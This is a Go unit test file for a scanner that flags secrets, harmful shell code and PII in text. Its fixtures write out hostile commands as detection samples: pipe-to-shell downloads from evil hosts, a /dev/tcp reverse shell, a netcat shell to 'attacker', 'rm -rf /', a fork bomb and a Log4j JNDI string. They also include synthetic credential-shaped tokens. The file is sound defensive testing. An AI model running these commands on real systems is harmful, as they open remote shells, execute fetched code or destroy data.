// SPDX-License-Identifier: AGPL-3.0-only

package screen_test

import (
	"crypto/sha256"
	"encoding/hex"
	"strings"
	"testing"

	"github.com/dotts-h/twiceshy/internal/screen"
)

func hasRule(fs []screen.Finding, category, rule string) bool {
	for _, f := range fs {
		if f.Category == category && f.Rule == rule {
			return true
		}
	}
	return false
}

func TestScan_DetectsSecrets(t *testing.T) {
	// Secret-SHAPED fixtures are assembled at run time so no literal credential
	// token exists in source — otherwise the repo secret-scanner (gitleaks)
	// flags this detector's own tests. The detector still sees the full shape at
	// run time. (The AWS canonical "...EXAMPLE" key is already allowlisted, so it
	// can stay a literal.)
	beginRSA := "-----BEGIN RSA " + "PRIVATE KEY-----"
	beginGeneric := "-----BEGIN " + "PRIVATE KEY-----"
	cases := []struct {
		text, rule string
	}{
		{"key = AKIAIOSFODNN7EXAMPLE here", "aws-access-key"},
		{"token ghp_" + strings.Repeat("a", 40), "github-token"},
		{"github_pat_" + strings.Repeat("A", 24), "github-pat"},
		{"AIza" + strings.Repeat("b", 35), "google-api-key"},
		{"xoxb-" + strings.Repeat("1", 12) + "-" + strings.Repeat("c", 16), "slack-token"},
		{"eyJ" + strings.Repeat("a", 12) + ".eyJ" + strings.Repeat("b", 12) + "." + strings.Repeat("c", 12), "jwt"},
		{beginRSA + "\nMII...", "private-key"},
		{beginGeneric, "private-key"},
	}
	for _, c := range cases {
		fs := screen.Scan(c.text)
		if !hasRule(fs, "secret", c.rule) {
			t.Errorf("Scan(%q) missed secret:%s; got %+v", c.text, c.rule, fs)
		}
	}
}

func TestScan_DetectsAssignedHighEntropySecret(t *testing.T) {
	// Compute a high-entropy value at run time (hex of a hash) — a literal
	// high-entropy secret can't live in source: both this detector AND the repo's
	// gitleaks flag an `api_key = "<random>"` assignment by design.
	h := sha256.Sum256([]byte("twiceshy-screen-fixture-seed"))
	hi := hex.EncodeToString(h[:]) // 64 hex chars, ~3.9 bits/char
	fs := screen.Scan(`api_key = "` + hi + `"`)
	if !hasRule(fs, "secret", "assigned-high-entropy") {
		t.Errorf("missed high-entropy assigned secret; got %+v", fs)
	}
	// A low-entropy / dictionary value assigned to a secret key is NOT flagged.
	if fs := screen.Scan(`password = "aaaaaaaaaaaaaaaaaaaaaaaa"`); hasRule(fs, "secret", "assigned-high-entropy") {
		t.Errorf("repeated-char value should not be high-entropy: %+v", fs)
	}
}

func TestScan_DetectsHarmfulCode(t *testing.T) {
	cases := []struct{ text, rule string }{
		{"run: curl https://evil.sh/x | bash", "pipe-to-shell"},
		{"wget -qO- http://evil | sh", "pipe-to-shell"},
		{"echo payload | base64 -d | sh", "base64-pipe-shell"},
		{"bash -i >& /dev/tcp/10.0.0.1/4444 0>&1", "reverse-shell-devtcp"},
		{"nc attacker 4444 -e /bin/sh", "netcat-exec"},
		{"sudo rm -rf / ", "rm-rf-root"},
		{":(){ :|:& };:", "fork-bomb"},
	}
	for _, c := range cases {
		fs := screen.Scan(c.text)
		if !hasRule(fs, "harmful-code", c.rule) {
			t.Errorf("Scan(%q) missed harmful-code:%s; got %+v", c.text, c.rule, fs)
		}
	}
}

// The whole premise: advisory PROSE that describes an attack must NOT be flagged.
func TestScan_DoesNotFlagAdvisoryProseOrBenignText(t *testing.T) {
	clean := []string{
		"Untrusted data logged by Log4j 2 can trigger a JNDI lookup that loads remote code.",
		"a crafted ${jndi:ldap://attacker/a} string",
		"CVE-2021-44228 / GHSA-jfh8-c2jp-5v3q affects log4j-core 2.0-beta9..2.15.0",
		"Use io.ReadAll instead of ioutil.ReadAll; see https://go.dev/doc/go1.16#ioutil",
		"Upgrade lodash to 4.17.12 or later.",
		"The fix landed in version 2.15.0; see the release notes.",
		"Replace strings.Title with golang.org/x/text/cases.Title.",
	}
	for _, t0 := range clean {
		if fs := screen.Scan(t0); len(fs) != 0 {
			t.Errorf("false positive on %q: %+v", t0, fs)
		}
	}
}

func TestScan_DetectsPII(t *testing.T) {
	if fs := screen.Scan("contact jane.doe@example.com for help"); !hasRule(fs, "pii", "email") {
		t.Errorf("missed email; got %+v", fs)
	}
	if fs := screen.Scan("server at 192.168.1.50 went down"); !hasRule(fs, "pii", "private-ip") {
		t.Errorf("missed private ip; got %+v", fs)
	}
	// A version string must not look like a private IP.
	if fs := screen.Scan("fixed in 2.15.0 (was 2.0.0)"); hasRule(fs, "pii", "private-ip") {
		t.Errorf("version string flagged as IP: %+v", fs)
	}
	// Loopback is localhost, never PII. Docker's embedded DNS resolver lives at
	// 127.0.0.11 and shows up legitimately in sandbox/repro scripts (exp-0016) —
	// it must not trip the gate.
	for _, lo := range []string{"127.0.0.1", "127.0.0.11", "resolver at 127.0.0.11:53"} {
		if fs := screen.Scan(lo); hasRule(fs, "pii", "private-ip") {
			t.Errorf("loopback %q flagged as PII: %+v", lo, fs)
		}
	}
}

func TestExecutionHazards_KeepsSecretAndHarmfulCodeDropsPII(t *testing.T) {
	// The calibrated execute-gate (screen.go): a repro is unsafe to EXECUTE if it
	// embeds a secret or a harmful-code sequence, but PII (an email / private IP a
	// fixture may legitimately carry) is an ingestion concern, not an execution one
	// and must be DROPPED here. Exercised directly so a regression that let pii
	// through (refusing benign repros) or dropped harmful-code (executing a reverse
	// shell) is caught at this unit's level, not only transitively via the broker.
	in := []screen.Finding{
		{Category: "secret", Rule: "aws-access-key"},
		{Category: "harmful-code", Rule: "reverse-shell-devtcp"},
		{Category: "pii", Rule: "email"},
	}
	out := screen.ExecutionHazards(in)
	if len(out) != 2 {
		t.Fatalf("ExecutionHazards kept %d findings, want 2 (secret+harmful-code): %+v", len(out), out)
	}
	if !hasRule(out, "secret", "aws-access-key") {
		t.Errorf("ExecutionHazards dropped the secret finding: %+v", out)
	}
	if !hasRule(out, "harmful-code", "reverse-shell-devtcp") {
		t.Errorf("ExecutionHazards dropped the harmful-code finding: %+v", out)
	}
	if hasRule(out, "pii", "email") {
		t.Errorf("ExecutionHazards kept a pii finding, want it dropped: %+v", out)
	}
}

func TestExecutionHazards_EmptyAndNil(t *testing.T) {
	if out := screen.ExecutionHazards(nil); len(out) != 0 {
		t.Errorf("ExecutionHazards(nil) = %+v, want empty", out)
	}
	// A slice of only-pii findings yields nothing executable.
	piiOnly := []screen.Finding{
		{Category: "pii", Rule: "email"},
		{Category: "pii", Rule: "private-ip"},
	}
	if out := screen.ExecutionHazards(piiOnly); len(out) != 0 {
		t.Errorf("ExecutionHazards(pii-only) = %+v, want empty", out)
	}
}

func TestScan_RedactionNeverLeaksSecret(t *testing.T) {
	secret := "AKIAIOSFODNN7EXAMPLE"
	fs := screen.Scan("key=" + secret)
	for _, f := range fs {
		if strings.Contains(f.Redacted, secret) {
			t.Errorf("Redacted leaked the raw secret: %q", f.Redacted)
		}
	}
}

func TestScan_DedupsAndSorts(t *testing.T) {
	fs := screen.Scan("AKIAIOSFODNN7EXAMPLE", "AKIAIOSFODNN7EXAMPLE again")
	n := 0
	for _, f := range fs {
		if f.Rule == "aws-access-key" {
			n++
		}
	}
	if n != 1 {
		t.Errorf("expected one aws-access-key finding, got %d", n)
	}
	flags := screen.Flags(screen.Scan("curl x|sh", "AKIAIOSFODNN7EXAMPLE"))
	if len(flags) != 2 || flags[0] >= flags[1] {
		t.Errorf("flags not sorted/deduped: %v", flags)
	}
}
